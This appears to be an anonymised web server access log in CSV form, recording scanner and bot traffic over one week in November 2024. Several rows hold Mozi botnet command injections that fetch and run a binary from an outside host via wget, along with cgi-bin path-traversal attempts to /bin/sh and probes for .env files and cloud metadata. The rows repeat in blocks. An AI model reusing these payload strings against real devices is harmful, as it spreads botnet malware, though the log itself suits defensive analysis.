ip,date,method,endpoint,status,size
21.123.242.102,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,
208.33.218.178,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0
10.57.70.174,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0
79.98.99.0,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0
126.145.134.8,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
200.31.16.5,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0
67.168.240.90,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0
172.211.155.152,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0
179.226.232.222,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0
253.90.168.209,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
246.211.210.160,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0
134.163.218.214,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0
176.11.162.156,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0
235.166.229.107,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0
231.138.105.107,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
136.191.55.75,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0
199.28.238.183,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
178.20.136.88,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
4.215.193.210,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
197.17.195.55,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0
69.177.43.196,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
115.127.29.10,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
125.182.118.110,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0
187.97.70.40,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0
20.138.85.153,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0
228.78.181.207,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0
133.1.56.54,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
67.208.119.133,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
78.54.8.129,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0
236.161.184.232,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0
200.9.225.106,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0
181.66.154.143,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0
78.194.110.222,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0
106.26.75.163,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
131.142.247.1,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
169.177.86.80,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0
63.217.254.202,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0
197.75.140.12,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0
79.16.254.14,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0
49.36.164.73,19/Nov/2024:20:16:26 +0000,,-,408,
40.253.44.252,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0
134.135.91.243,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0
231.134.136.29,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0
150.68.146.153,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0
134.216.57.17,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0
171.184.51.15,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0
166.39.42.89,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0
167.92.167.252,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
197.203.139.193,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0
94.224.189.13,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0
5.96.160.185,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0
120.4.23.217,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
84.2.4.161,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0
7.121.235.211,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0
121.240.131.56,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0
96.47.170.138,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0
71.155.43.9,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
33.108.54.79,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0
206.188.110.94,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0
149.222.110.12,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0
29.55.204.190,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0
54.173.68.136,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0
157.82.183.123,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0
126.140.74.227,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0
70.161.188.115,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
226.213.221.197,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0
163.69.61.171,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0
8.59.113.54,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0
31.28.3.220,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0
165.220.18.72,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
239.123.150.189,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0
20.58.239.159,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
193.185.229.154,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0
150.205.226.208,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0
54.48.115.86,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0
214.161.163.55,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0
160.114.249.71,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0
204.29.82.244,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0
86.115.133.106,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0
248.143.68.188,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
9.138.240.207,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0
206.49.88.205,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0
185.173.29.120,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
35.239.145.179,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0
79.67.1.27,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
203.47.164.167,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0
117.17.8.80,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0
114.206.223.168,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0
238.4.96.86,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0
18.221.245.28,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0
62.30.58.151,15/Nov/2024:00:35:31 +0000,,-,408,
181.10.50.220,15/Nov/2024:00:36:08 +0000,,-,408,
183.142.166.130,15/Nov/2024:00:36:30 +0000,,-,408,
60.116.71.224,15/Nov/2024:00:36:34 +0000,,stats,400,226.0
184.213.111.97,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
62.8.239.148,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0
204.168.220.132,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0
96.18.251.239,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
161.158.31.131,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0
112.144.81.11,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0
160.250.118.6,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0
62.102.39.95,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0
135.82.22.59,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0
64.85.156.30,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
110.214.121.38,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0
106.150.145.182,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0
46.115.193.115,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0
51.127.93.154,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
137.178.15.48,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0
87.190.154.80,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0
47.163.81.176,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0
161.178.133.209,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0
253.170.78.166,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0
94.135.217.202,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
215.35.222.184,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
120.164.118.154,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
198.165.175.253,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,
30.233.38.127,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,
84.247.251.251,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0
33.15.28.137,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0
250.139.108.225,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0
226.117.1.236,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
253.29.172.189,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0
189.217.189.108,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0
184.117.6.56,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0
183.152.104.51,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0
34.148.184.248,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
208.189.140.79,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0
52.162.71.225,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0
78.113.75.190,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0
76.155.146.170,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0
61.112.243.212,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
6.72.25.98,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0
19.11.4.121,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
173.75.172.75,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
95.35.76.9,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
192.58.186.148,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0
15.15.81.139,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
249.222.167.37,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
247.35.140.133,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0
197.38.62.145,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0
105.133.250.142,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0
121.117.66.44,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0
214.88.109.155,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
153.51.100.179,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
192.147.17.233,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0
54.115.186.101,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0
23.141.15.76,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0
219.104.153.244,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0
162.254.156.51,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0
82.47.163.2,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
174.143.235.51,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
191.92.242.201,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0
45.106.29.134,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0
183.23.125.215,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0
26.233.232.193,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0
53.201.234.67,19/Nov/2024:20:16:26 +0000,,-,408,
152.153.60.130,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0
126.48.133.10,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0
253.131.167.254,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0
94.140.42.195,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0
61.250.45.87,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0
138.68.11.57,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0
193.200.151.79,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0
233.40.229.92,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
79.28.83.1,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0
33.120.218.71,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0
99.107.21.176,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0
198.51.94.235,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
104.238.35.35,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0
70.115.21.111,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0
66.99.169.106,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0
58.246.174.85,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0
182.248.40.78,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
135.140.79.133,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0
112.15.15.155,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0
196.175.118.223,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0
108.199.103.66,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0
102.126.12.11,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0
235.90.243.254,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0
181.87.29.236,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0
76.121.62.100,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
85.65.113.65,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0
40.196.100.75,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0
23.97.97.115,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0
99.185.94.4,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0
40.214.72.132,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
114.116.207.169,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0
145.151.121.150,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
166.64.229.56,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0
91.229.183.201,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0
218.186.207.252,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0
127.210.162.22,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0
164.228.57.245,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0
146.209.101.52,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0
244.90.177.98,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0
90.91.67.206,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
96.81.21.81,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0
204.140.229.62,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0
179.167.225.68,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
166.80.151.10,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0
115.116.232.235,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
231.227.168.65,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0
68.0.185.63,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0
173.59.160.167,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0
117.197.24.111,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0
33.143.13.129,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0
186.233.204.197,15/Nov/2024:00:35:31 +0000,,-,408,
103.42.175.244,15/Nov/2024:00:36:08 +0000,,-,408,
2.2.42.236,15/Nov/2024:00:36:30 +0000,,-,408,
114.93.135.8,15/Nov/2024:00:36:34 +0000,,stats,400,226.0
91.227.226.206,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
43.44.159.174,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0
124.151.173.138,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0
150.225.140.6,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
82.146.1.214,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0
156.64.79.203,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0
77.6.234.133,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0
142.178.43.194,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0
149.46.199.34,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0
29.56.152.87,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
63.190.42.60,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0
81.32.10.71,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0
185.32.110.199,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0
183.59.225.206,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
156.246.85.164,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0
239.98.252.131,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0
129.163.233.160,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0
154.228.221.201,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0
78.7.175.113,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0
132.170.178.54,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
40.24.23.231,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
211.94.113.213,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
83.135.89.101,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,
213.0.69.17,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,
192.20.86.130,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0
103.59.43.197,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0
6.154.137.186,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0
96.87.40.109,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
153.126.246.105,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0
117.34.182.126,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0
110.76.150.232,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0
86.234.250.17,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0
252.176.96.211,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
50.136.95.1,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0
182.245.202.203,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0
106.134.93.109,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0
243.28.224.12,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0
192.90.91.143,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
203.194.50.203,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0
173.15.238.100,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
39.44.118.184,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
148.247.231.227,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
109.201.18.60,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0
59.192.20.251,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
137.23.183.249,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
159.73.152.213,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0
214.29.143.188,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0
238.130.185.173,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0
32.168.184.114,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0
124.226.228.70,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
212.245.254.49,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
54.145.181.41,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0
118.80.194.131,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0
225.166.86.210,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0
36.22.19.57,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0
44.85.35.39,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0
214.221.61.143,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
76.172.114.68,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
222.228.76.219,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0
186.66.208.110,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0
24.226.206.203,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0
112.19.135.222,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0
34.170.129.194,19/Nov/2024:20:16:26 +0000,,-,408,
14.114.245.127,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0
44.20.172.152,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0
